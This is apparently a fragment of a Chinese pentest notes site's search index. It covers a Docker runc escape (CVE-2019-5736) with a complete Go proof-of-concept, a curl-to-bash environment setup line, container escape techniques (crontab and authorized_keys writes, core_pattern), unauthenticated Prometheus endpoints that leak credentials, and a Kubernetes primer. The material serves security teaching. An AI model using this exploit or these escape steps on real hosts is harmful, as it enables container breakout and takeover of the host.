\u6743\u9650\u9003\u9038"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#docker-runc-cve-2019-5736","text":"ref: https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/ \u63a8\u8350\u9605\u8bfb docker version <=18.09.2 RunC version <=1.0-rc6 \u73af\u5883\u642d\u5efa,ubuntu\u4e0b\u7528metarget\uff0c\u5b98\u65b9\u63a8\u8350\u7248\u672c\u4e3aUbuntu 16.04 or 18.04 metarget cnv install cve-2019-5736 \u6216\u8005\u811a\u672c curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh","title":"docker runc \u9003\u9038 CVE-2019-5736"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_9","text":"runc\u662fDocker\u7684\u5bb9\u5668\u8fd0\u884c\u65f6\uff0c\u8d1f\u8d23Dokcer\u5bb9\u5668\u7684\u5bb9\u5668\u751f\u6210\u548c\u8fd0\u884c\uff0c\u4e3e\u4e2a\u4f8b\u5b50 docker run -it ubuntu bash \u5bb9\u5668\u7684bash\u4ea4\u4e92\u754c\u9762\u5c31\u662f\u7531runc\u542f\u52a8\u7684\u3002runc\u4e00\u822c\u5728\u5bbf\u4e3b\u673a\u4e0a\u4ee5root\u6743\u9650\u8dd1\u7740\u3002 \u540c\u65f6\u5728linux\u4e2d\u5b58\u5728/proc/pid/exe \u8fd9\u4e2a\u4e1c\u897f\uff0c\u6307\u5411\u67d0\u8fdb\u7a0b\u7684\u6e90\u7a0b\u5e8f\uff0c\u5982\u679c\u662f/proc/self/exe \u5c31\u662f\u6307\u5411\u5f53\u524d\u8fdb\u7a0b\u7684\u6e90\u7a0b\u5e8f\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301\uff0c\u5c06\u5bb9\u5668\u7684bash\u5185\u5bb9\u66f4\u6539\u4e3a#!/proc/self/exe\uff0c\u5373\u6307\u5411\u5f53\u524d\u8fdb\u7a0b\u6e90\u7a0b\u5e8f\uff0c\u8fd9\u6837\u4e0b\u6b21\u6267\u884c\u5bb9\u5668docker run -it ubuntu bash\u65f6\u5c31\u4f1a\u6267\u884crunc\u672c\u8eab\u3002 runc\u5728\u5bb9\u5668\u4e2d\u662f\u53ef\u4ee5\u88ab\u627e\u5230\u7684\uff0c\u5982\u679c\u6211\u4eec\u4fee\u6539\u4e86runc\u6587\u4ef6\u672c\u8eab\u7684\u5185\u5bb9\uff0c\u5982\u4fee\u6539\u4e3a\u53cd\u5f39shell\uff0c\u90a3\u4e48\u4e0b\u6b21\u6267\u884cdocker run -it ubuntu bash\u65f6\u5c31\u4f1a\u81ea\u52a8\u53cd\u5f39\u4e00\u4e2ashell\u56de\u6765\u3002","title":"\u539f\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_10","text":"exp\uff1a https://github.com/Frichetten/CVE-2019-5736-PoC \u6ce8\u91ca\u5f15\u7528\u81ea https://ble55ing.github.io/2020/03/19/docker-20195736/ package main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" ) // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash \\n mkdir /hack_in &\\n\" func main() { //\u9996\u5148\u6765\u770b\u770b\u80fd\u4e0d\u80fd\u6253\u5f00/bin/sh\uff0c\u5373\u6709root\u6743\u9650\u5c31\u6210 fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return } //\u7136\u540e\u5c06\u5176\u8986\u76d6\u4e3a#!/proc/self/exe fmt.Fprintln(fd, \"#!/proc/self/exe\") err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\"[+] Overwritten /bin/sh successfully\") // \u5faa\u73af\u904d\u5386/proc\u91cc\u7684\u6587\u4ef6\uff0c\u76f4\u5230\u627e\u5230runc\u662f\u54ea\u4e2a\u8fdb\u7a0b var found int for found == 0 { pids, err := ioutil.ReadDir(\"/proc\") if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\") fstring := string(fbytes) if strings.Contains(fstring, \"runc\") { fmt.Println(\"[+] Found the PID:\", f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // \u5faa\u73af\u53bb\u8bfb\u8fd9\u4e2a/proc/pid/exe\uff0c\u5148\u62ff\u5230\u4e00\u4e2a\u8be5\u6587\u4ef6\u7684fd\uff0c\u8be5fd\u5c31\u6307\u5411\u4e86runc\u7a0b\u5e8f\u7684\u4f4d\u7f6e var handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777) if int(handle.Fd()) > 0 { handleFd = int(handle.Fd()) } } fmt.Println(\"[+] Successfully got the file handle\") // \u7136\u540e\u4e0d\u65ad\u7684\u53bb\u5c1d\u8bd5\u5199\u8fd9\u4e2a\u6307\u5411\u7684\u6587\u4ef6\uff0c\u4e00\u5f00\u59cb\u7531\u4e8erunc\u4f1a\u5148\u5360\u7528\u7740\uff0c\u5199\u4e0d\u8fdb\u53bb\uff0c\u76f4\u5230runc\u7684\u5360\u7528\u89e3\u9664\u4e86\uff0c\u5c31\u7acb\u5373 for { writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) > 0 { fmt.Println(\"[+] Successfully got write handle\", writeHandle) writeHandle.Write([]byte(payload)) return } } } \u7528go\u6253\u5305 go build a.go \u6a21\u62df\u9ed1\u5ba2\u628a\u4e8c\u8fdb\u5236\u6587\u4ef6\u4f20\u4e0a\u53bb\uff0c\u5e76\u7ed9\u4e88\u53ef\u6267\u884c\u6743 docker cp ./a 1f615cc4c464:/tmp chmod 777 /tmp/a \u6267\u884cexp \u7136\u540e\u5207\u4e2a\u7a97\u53e3\uff0c\u518d\u6267\u884c\u4e00\u4e0bdocker exec -it 1f615cc4c464 /bin/sh \u53ef\u4ee5\u53d1\u73b0\u6076\u610f\u6307\u4ee4\uff08\u5411\u6839\u76ee\u5f55\u5199\u5165hack_in\u6587\u4ef6\u5939\uff09\u88ab\u6210\u529f\u6267\u884c \uff08\u8fd9\u91cc\u6211\u6362\u4e86\u4e2a\u73af\u5883\uff09","title":"\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_11","text":"\u5f15\u7528\u81ea\u817e\u8baf\u84dd\u519b\uff1a \u4ee5\u76ee\u6807\u201c\u83b7\u53d6\u5bbf\u4e3b\u673a\u4e0a\u7684\u914d\u7f6e\u6587\u4ef6\u201d\u4e3a\u4f8b\uff0c\u4ee5\u4e0b\u51e0\u79cd\u9003\u9038\u624b\u6cd5\u5728\u5bb9\u6613\u5728\u9632\u5fa1\u56e2\u961f\u4e2d\u66b4\u9732\u7684\u6982\u7387\u4ece\u5927\u5230\u5c0f\uff0c\u6392\u5e8f\u5982\u4e0b(\u90e8\u5206\u5178\u578b\u624b\u6cd5\u4e3e\u4f8b\uff0c\u4e0d\u540c\u7684EDR\u60c5\u51b5\u4e0d\u540c)\uff1a mount /etc + write crontab mount /root/.ssh + write authorized_keys old CVE/vulnerability exploit write cgroup notify_on_release write procfs core_pattern volumeMounts: / + chroot remount and rewrite cgroup create ptrace cap container websocket/sock shell + volumeMounts: /path","title":"\u9003\u9038\u603b\u7ed3"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Prometheus/Prometheus/","text":"Prometheus \u76ee\u5f55 \u654f\u611f\u672a\u6388\u6743 /api/v1/status/config /api/v1/targets /api/v1/status/flags \u5f00\u6e90\u7684\u3001\u57fa\u4e8e\u6307\u6807\u7684\u4e8b\u4ef6\u76d1\u63a7\u548c\u8b66\u62a5\u89e3\u51b3\u65b9\u6848\uff0c\u9002\u7528\u4e8e\u4e91\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u88ab\u8fd1 800 \u5bb6\u4e91\u539f\u751f\u7ec4\u7ec7\u4f7f\u7528\uff0c\u5305\u62ec Uber\u3001Slack\u3001Robinhood \u7b49\u3002\u901a\u8fc7\u4ece\u5404\u4e2a\u7aef\u70b9\u6293\u53d6\u5b9e\u65f6\u6307\u6807 \u654f\u611f\u672a\u6388\u6743 /api/v1/status/config \u8be5\u6587\u4ef6\u8fd8\u5305\u542b\u76ee\u6807\u5730\u5740\u548c\u8b66\u62a5/\u53d1\u73b0\u670d\u52a1\u4ee5\u53ca\u8bbf\u95ee\u5b83\u4eec\u6240\u9700\u7684\u51ed\u636e\u3002\u901a\u5e38\uff0cPrometheus \u7528\u5360\u4f4d\u7b26\u66ff\u6362\u51ed\u636e\u914d\u7f6e\u914d\u7f6e\u5b57\u6bb5\u4e2d\u7684\u5bc6\u7801 <secret> \uff08\u5c3d\u7ba1\u8fd9\u4ecd\u7136\u4f1a\u6cc4\u6f0f\u7528\u6237\u540d\uff09\uff1a /api/v1/targets \u4e86\u663e\u793a\u76ee\u6807\u673a\u5668\u5730\u5740\u4e4b\u5916\uff0c\u7aef\u70b9\u8fd8\u516c\u5f00\u76ee\u6807\u63d0\u4f9b\u8005\u6dfb\u52a0\u7684\u5143\u6570\u636e\u6807\u7b7e\u3002\u8fd9\u4e9b\u6807\u7b7e\u65e8\u5728\u5305\u542b\u975e\u654f\u611f\u503c\uff0c\u4f8b\u5982\u670d\u52a1\u5668\u7684\u540d\u79f0\u6216\u5176\u63cf\u8ff0\uff0c\u4f46\u5404\u79cd\u4e91\u5e73\u53f0\u53ef\u80fd\u4f1a\u81ea\u52a8\u516c\u5f00\u8fd9\u4e9b\u6807\u7b7e\u4e2d\u7684\u654f\u611f\u6570\u636e\uff0c\u800c\u4e14\u901a\u5e38\u5728\u5f00\u53d1\u4eba\u5458\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u3002 /api/v1/status/flags \u8be5 flags \u7aef\u70b9\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b8c\u6574\u8def\u5f84\u7684\u914d\u7f6e\u6587\u4ef6\u3002\u5982\u679c\u6587\u4ef6\u5b58\u50a8\u5728\u4e3b\u76ee\u5f55\u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u6cc4\u6f0f\u7528\u6237\u540d\uff1a","title":"Prometheus"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Prometheus/Prometheus/#prometheus","text":"","title":"Prometheus"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Prometheus/Prometheus/#_1","text":"\u654f\u611f\u672a\u6388\u6743 /api/v1/status/config /api/v1/targets /api/v1/status/flags \u5f00\u6e90\u7684\u3001\u57fa\u4e8e\u6307\u6807\u7684\u4e8b\u4ef6\u76d1\u63a7\u548c\u8b66\u62a5\u89e3\u51b3\u65b9\u6848\uff0c\u9002\u7528\u4e8e\u4e91\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u88ab\u8fd1 800 \u5bb6\u4e91\u539f\u751f\u7ec4\u7ec7\u4f7f\u7528\uff0c\u5305\u62ec Uber\u3001Slack\u3001Robinhood \u7b49\u3002\u901a\u8fc7\u4ece\u5404\u4e2a\u7aef\u70b9\u6293\u53d6\u5b9e\u65f6\u6307\u6807","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Prometheus/Prometheus/#_2","text":"","title":"\u654f\u611f\u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Prometheus/Prometheus/#apiv1statusconfig","text":"\u8be5\u6587\u4ef6\u8fd8\u5305\u542b\u76ee\u6807\u5730\u5740\u548c\u8b66\u62a5/\u53d1\u73b0\u670d\u52a1\u4ee5\u53ca\u8bbf\u95ee\u5b83\u4eec\u6240\u9700\u7684\u51ed\u636e\u3002\u901a\u5e38\uff0cPrometheus \u7528\u5360\u4f4d\u7b26\u66ff\u6362\u51ed\u636e\u914d\u7f6e\u914d\u7f6e\u5b57\u6bb5\u4e2d\u7684\u5bc6\u7801 <secret> \uff08\u5c3d\u7ba1\u8fd9\u4ecd\u7136\u4f1a\u6cc4\u6f0f\u7528\u6237\u540d\uff09\uff1a","title":"/api/v1/status/config"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Prometheus/Prometheus/#apiv1targets","text":"\u4e86\u663e\u793a\u76ee\u6807\u673a\u5668\u5730\u5740\u4e4b\u5916\uff0c\u7aef\u70b9\u8fd8\u516c\u5f00\u76ee\u6807\u63d0\u4f9b\u8005\u6dfb\u52a0\u7684\u5143\u6570\u636e\u6807\u7b7e\u3002\u8fd9\u4e9b\u6807\u7b7e\u65e8\u5728\u5305\u542b\u975e\u654f\u611f\u503c\uff0c\u4f8b\u5982\u670d\u52a1\u5668\u7684\u540d\u79f0\u6216\u5176\u63cf\u8ff0\uff0c\u4f46\u5404\u79cd\u4e91\u5e73\u53f0\u53ef\u80fd\u4f1a\u81ea\u52a8\u516c\u5f00\u8fd9\u4e9b\u6807\u7b7e\u4e2d\u7684\u654f\u611f\u6570\u636e\uff0c\u800c\u4e14\u901a\u5e38\u5728\u5f00\u53d1\u4eba\u5458\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u3002","title":"/api/v1/targets"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Prometheus/Prometheus/#apiv1statusflags","text":"\u8be5 flags \u7aef\u70b9\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b8c\u6574\u8def\u5f84\u7684\u914d\u7f6e\u6587\u4ef6\u3002\u5982\u679c\u6587\u4ef6\u5b58\u50a8\u5728\u4e3b\u76ee\u5f55\u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u6cc4\u6f0f\u7528\u6237\u540d\uff1a","title":"/api/v1/status/flags"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/","text":"k8s\u5b89\u5168 \u626b\u76f2 \u76ee\u5f55 \u4e91 \u4f55\u4e3ak8s \uff1f K8S \u67b6\u6784\u7b80\u8ff0 \u642d\u5efaK8S K8S\u7684\u57fa\u7840\u6982\u5ff5 \u90e8\u7f72\u2014\u2014Deployment POD\u4e0eNode \u670d\u52a1\u2014\u2014Service \u4f38\u7f29\u2014\u2014Scaling \u6eda\u52a8\u66f4\u65b0\u2014\u2014Rolling Update K8S\u5b89\u5168 \u521d\u59cb\u8bbf\u95ee \u4e91\u8d26\u53f7AK\u6cc4\u9732 \u6076\u610f\u955c\u50cf API Server\u672a\u6388\u6743 configfile \u6cc4\u9732 \u5bb9\u5668\u5185\u90e8\u5e94\u7528\u5165\u4fb5 \u79c1\u6709\u955c\u50cf\u5e93\u66b4\u9732 docker.sock \u5229\u7528 kubelet \u672a\u6388\u6743 etcd \u672a\u6388\u6743 \u6267\u884c *\u76ee\u5f55\u6302\u8f7d\u9003\u9038 \u5229\u7528Service Account\u8fde\u63a5API Server\u6267\u884c\u6307\u4ee4 \u6301\u4e45\u5316 \u6743\u9650\u63d0\u5347 \u63a2\u6d4b \u662f\u5426\u5728\u5bb9\u5668\u73af\u5883\u4e2d ref \u4e91 \u4e91\u7684\u5b9a\u4e49\u770b\u4f3c\u6a21\u7cca\uff0c\u4f46\u672c\u8d28\u4e0a\uff0c\u5b83\u662f\u4e00\u4e2a\u7528\u4e8e\u63cf\u8ff0\u5168\u7403\u670d\u52a1\u5668\u7f51\u7edc\u7684\u672f\u8bed\uff0c\u6bcf\u4e2a\u670d\u52a1\u5668\u90fd\u6709\u4e00\u4e2a\u72ec\u7279\u7684\u529f\u80fd\u3002\u4e91\u4e0d\u662f\u4e00\u4e2a\u7269\u7406\u5b9e\u4f53\uff0c\u800c\u662f\u4e00\u4e2a\u5e9e\u5927\u7684\u5168\u7403\u8fdc\u7a0b\u670d\u52a1\u5668\u7f51\u7edc\uff0c\u5b83\u4eec\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u65e8\u5728\u4f5c\u4e3a\u5355\u4e00\u7684\u751f\u6001\u7cfb\u7edf\u8fd0\u884c\u3002\u8fd9\u4e9b\u670d\u52a1\u5668\u8bbe\u8ba1\u7528\u4e8e\u5b58\u50a8\u548c\u7ba1\u7406\u6570\u636e\u3001\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u8005\u4ea4\u4ed8\u5185\u5bb9/\u670d\u52a1\uff08\u5982\u89c6\u9891\u77ed\u7247\u3001Web \u90ae\u4ef6\u3001\u529e\u516c\u5ba4\u751f\u4ea7\u529b\u8f6f\u4ef6\u6216\u793e\u4ea4\u5a92\u4f53\uff09\u3002\u4e0d\u662f\u4ece\u672c\u5730\u6216\u4e2a\u4eba\u8ba1\u7b97\u673a\u8bbf\u95ee\u6587\u4ef6\u548c\u6570\u636e\uff0c\u800c\u662f\u901a\u8fc7\u4efb\u4f55\u652f\u6301 Internet \u7684\u8bbe\u5907\u5728\u7ebf\u8bbf\u95ee - \u8fd9\u4e9b\u4fe1\u606f\u5728\u5fc5\u8981\u65f6\u968f\u65f6\u968f\u5730\u53ef\u7528\u3002 \u4f01\u4e1a\u91c7\u7528 4 \u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u90e8\u7f72\u4e91\u8d44\u6e90\u3002\u5b58\u5728\u4e00\u4e2a \u516c\u6709\u4e91 \uff0c\u5b83\u901a\u8fc7 Internet \u5171\u4eab\u8d44\u6e90\u5e76\u5411\u516c\u4f17\u63d0\u4f9b\u670d\u52a1\uff1b\u4e00\u4e2a \u79c1\u6709\u4e91 \uff0c\u5b83\u4e0d\u8fdb\u884c\u5171\u4eab\u4e14\u7ecf\u7531\u901a\u5e38\u672c\u5730\u6258\u7ba1\u7684\u79c1\u6709\u5185\u90e8\u7f51\u7edc\u63d0\u4f9b\u670d\u52a1\uff1b\u4e00\u4e2a \u6df7\u5408\u4e91 \uff0c\u5b83\u6839\u636e\u5176\u76ee\u7684\u5728\u516c\u6709\u4e91\u548c\u79c1\u6709\u4e91\u4e4b\u95f4\u5171\u4eab\u670d\u52a1\uff1b\u4ee5\u53ca\u4e00\u4e2a\u793e\u533a\u4e91\uff0c\u5b83\u4ec5\u5728\u7ec4\u7ec7\u4e4b\u95f4\uff08\u4f8b\u5982\u4e0e\u653f\u5e9c\u673a\u6784\uff09\u5171\u4eab\u8d44\u6e90\u3002 \u4f55\u4e3ak8s \uff1f k8s\u5373Kubernetes\u3002 \u5176\u4e3agoogle\u5f00\u53d1\u6765\u88ab\u7528\u4e8e\u5bb9\u5668\u7ba1\u7406\u7684\u5f00\u6e90\u5e94\u7528\u7a0b\u5e8f\uff0c\u53ef\u5e2e\u52a9\u521b\u5efa\u548c\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u7684\u5bb9\u5668\u5316\u3002 \u7528\u4e00\u4e2a\u7684\u4f8b\u5b50\u6765\u63cf\u8ff0\uff1a\"\u5f53\u865a\u62df\u5316\u5bb9\u5668Docker\u6709\u592a\u591a\u8981\u7ba1\u7406\u7684\u65f6\u5019\uff0c\u624b\u52a8\u7ba1\u7406\u5c31\u4f1a\u5f88\u9ebb\u70e6\uff0c\u4e8e\u662f\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7k8s\u6765\u7b80\u5316\u6211\u4eec\u7684\u7ba1\u7406\" K8S \u67b6\u6784\u7b80\u8ff0 \u6211\u4eec\u5728\u4e0a\u6587\u5df2\u7ecf\u77e5\u9053\uff0cK8S\u662f\u7528\u4e8e\u7ba1\u7406\u865a\u62df\u5316\u5bb9\u5668\u7684\u4e00\u4e2a\u5e94\u7528\u7cfb\u7edf\uff0c\u5728\u8fd9\u5c0f\u8282\u4e2d\u4f1a\u7740\u91cd\u8bb2\u8ff0K8S\u7684\u67b6\u6784\u3001\u5b9e\u73b0\u539f\u7406\u3002 \u4e0b\u56fe\u4e3aK8S\u67b6\u6784\u7684\u6982\u89c8\uff1a k8s\u4e3b\u8981\u7531\u8f83\u5c11\u7684master\u8282\u70b9\u4ee5\u53ca\u5176\u5bf9\u5e94\u7684\u591a\u4e2aNode\u8282\u70b9\u7ec4\u6210\u3002master\u7528\u4e8e\u5bf9Node\u8282\u70b9\u8fdb\u884c\u63a7\u5236\u7ba1\u7406\uff0c\u4e00\u4e2ak8s\u96c6\u7fa4\u4e2d\u81f3\u5c11\u8981\u6709\u4e00\u53f0master\u8282\u70b9\u3002 Master\u8282\u70b9\u4e2d\u5305\u542b\u5f88\u591a\u7684\u7ec4\u4ef6\uff0c\u4e3b\u8981\u4e3a\u5982\u4e0b etcd \u5b83\u5b58\u50a8\u96c6\u7fa4\u4e2d\u6bcf\u4e2a\u8282\u70b9\u53ef\u4ee5\u4f7f\u7528\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u5b83\u662f\u4e00\u4e2a\u9ad8\u53ef\u7528\u6027\u952e\u503c\u5b58\u50a8\uff0c\u53ef\u4ee5\u5728\u591a\u4e2a\u8282\u70b9\u4e4b\u95f4\u5206\u5e03\u3002\u53ea\u6709Kubernetes API\u670d\u52a1\u5668\u53ef\u4ee5\u8bbf\u95ee\u5b83\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u5177\u6709\u4e00\u4e9b\u654f\u611f\u4fe1\u606f\u3002\u8fd9\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u952e\u503c\u5b58\u50a8\uff0c\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u8bbf\u95ee\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u5b58\u50a8\u8282\u70b9\u4fe1\u606f API server Kubernetes\u662f\u4e00\u4e2aAPI\u670d\u52a1\u5668\uff0c\u5b83\u4f7f\u7528API\u5728\u96c6\u7fa4\u4e0a\u63d0\u4f9b\u6240\u6709\u64cd\u4f5c\u3002API\u670d\u52a1\u5668\u5b9e\u73b0\u4e86\u4e00\u4e2a\u63a5\u53e3\uff0c\u8fd9\u610f\u5473\u7740\u4e0d\u540c\u7684\u5de5\u5177\u548c\u5e93\u53ef\u4ee5\u8f7b\u677e\u5730\u4e0e\u5176\u8fdb\u884c\u901a\u4fe1\u3002Kubeconfig\u662f\u4e0e\u53ef\u7528\u4e8e\u901a\u4fe1\u7684\u670d\u52a1\u5668\u7aef\u5de5\u5177\u4e00\u8d77\u7684\u8f6f\u4ef6\u5305\u3002\u5b83\u516c\u5f00\u4e86Kubernetes API \u7b80\u800c\u8a00\u4e4b\uff1a\u8bfb\u53d6\u4e0e\u89e3\u6790\u8bf7\u6c42\u6307\u4ee4\u7684\u4e2d\u67a2 Controller Manage \u8be5\u7ec4\u4ef6\u8d1f\u8d23\u8c03\u8282\u7fa4\u96c6\u72b6\u6001\u5e76\u6267\u884c\u4efb\u52a1\u7684\u5927\u591a\u6570\u6536\u96c6\u5668\u3002\u901a\u5e38\uff0c\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u5728\u975e\u7ec8\u6b62\u5faa\u73af\u4e2d\u8fd0\u884c\u7684\u5b88\u62a4\u7a0b\u5e8f\uff0c\u8be5\u5b88\u62a4\u7a0b\u5e8f\u8d1f\u8d23\u6536\u96c6\u4fe1\u606f\u5e76\u5c06\u5176\u53d1\u9001\u5230API\u670d\u52a1\u5668\u3002\u5b83\u81f4\u529b\u4e8e\u83b7\u53d6\u7fa4\u96c6\u7684\u5171\u4eab\u72b6\u6001\uff0c\u7136\u540e\u8fdb\u884c\u66f4\u6539\u4ee5\u4f7f\u670d\u52a1\u5668\u7684\u5f53\u524d\u72b6\u6001\u8fbe\u5230\u6240\u9700\u72b6\u6001\u3002\u5173\u952e\u63a7\u5236\u5668\u662f\u590d\u5236\u63a7\u5236\u5668\uff0c\u7aef\u70b9\u63a7\u5236\u5668\uff0c\u540d\u79f0\u7a7a\u95f4\u63a7\u5236\u5668\u548c\u670d\u52a1\u5e10\u6237\u63a7\u5236\u5668\u3002\u63a7\u5236\u5668\u7ba1\u7406\u5668\u8fd0\u884c\u4e0d\u540c\u7c7b\u578b\u7684\u63a7\u5236\u5668\u6765\u5904\u7406\u8282\u70b9\uff0c\u7aef\u70b9\u7b49\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u7ef4\u62a4k8s\u8d44\u6e90 Scheduler \u8fd9\u662fKubernetes master\u7684\u5173\u952e\u7ec4\u4ef6\u4e4b\u4e00\u3002\u5b83\u662f\u4e3b\u670d\u52a1\u5668\u4e2d\u8d1f\u8d23\u5206\u914d\u5de5\u4f5c\u8d1f\u8f7d\u7684\u670d\u52a1\u3002\u5b83\u8d1f\u8d23\u8ddf\u8e2a\u7fa4\u96c6\u8282\u70b9\u4e0a\u5de5\u4f5c\u8d1f\u8f7d\u7684\u5229\u7528\u7387\uff0c\u7136\u540e\u5c06\u5de5\u4f5c\u8d1f\u8f7d\u653e\u5728\u53ef\u7528\u8d44\u6e90\u4e0a\u5e76\u63a5\u53d7\u8be5\u5de5\u4f5c\u8d1f\u8f7d\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u8fd9\u662f\u8d1f\u8d23\u5c06Pod\u5206\u914d\u7ed9\u53ef\u7528\u8282\u70b9\u7684\u673a\u5236\u3002\u8c03\u5ea6\u7a0b\u5e8f\u8d1f\u8d23\u5de5\u4f5c\u8d1f\u8f7d\u5229\u7528\u7387\uff0c\u5e76\u5c06Pod\u5206\u914d\u7ed9\u65b0\u8282\u70b9\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u8d1f\u8f7d\u5747\u8861\u8c03\u5ea6\u5668 Node\u8282\u70b9\u4e5f\u5305\u542b\u4e86\u5f88\u591a\u7ec4\u4ef6\uff0c\u4e3b\u8981\u5982\u4e0b Docker Docker\u5f15\u64ce\uff0c\u8fd0\u884c\u7740\u5bb9\u5668\u7684\u57fa\u7840\u73af\u5883 kubelet \u5728\u6bcf\u4e2anode\u8282\u70b9\u90fd\u5b58\u5728\u4e00\u4efd\uff0c\u4e3b\u8981\u6765\u6267\u884c\u5173\u4e8e\u8d44\u6e90\u64cd\u4f5c\u7684\u6307\u4ee4\uff0c\u8d1f\u8d23pod\u7684\u7ef4\u62a4\u3002 kube-proxy \u4ee3\u7406\u670d\u52a1\uff0c\u7528\u4e8e\u8d1f\u8f7d\u5747\u8861\uff0c\u5728\u591a\u4e2apod\u4e4b\u95f4\u505a\u8d1f\u8f7d\u5747\u8861 fluentd \u65e5\u5fd7\u6536\u96c6\u670d\u52a1 pod pod\u662fk8s\u7684\u6700\u5c0f\u670d\u52a1\u5355\u5143\uff0cpod\u5185\u90e8\u624d\u662f\u5bb9\u5668\uff0ck8s\u901a\u8fc7\u64cd\u4f5cpod\u6765\u64cd\u4f5c\u5bb9\u5668\u3002\u4e00\u4e2aNode\u8282\u70b9\u53ef\u4ee5\u6709\u591a\u4e2aPod Pod\u53ef\u4ee5\u8bf4\u662fNode\u8282\u70b9\u4e2d\u6700\u6838\u5fc3\u7684\u90e8\u5206\uff0cPod\u4e5f\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u5b83\u662f\u4e00\u4e2a\"\u7528\u6765\u5c01\u88c5\u5bb9\u5668\u7684\u5bb9\u5668\"\u3002\u4e00\u4e2aPod\u4e2d\u5f80\u5f80\u4f1a\u88c5\u8f7d\u591a\u4e2a\u5bb9\u5668\uff0c\u8fd9\u4e9b\u5bb9\u5668\u5171\u7528\u4e00\u4e2a\u865a\u62df\u73af\u5883\uff0c\u5171\u4eab\u7740\u7f51\u7edc\u548c\u5b58\u50a8\u7b49\u8d44\u6e90\u3002 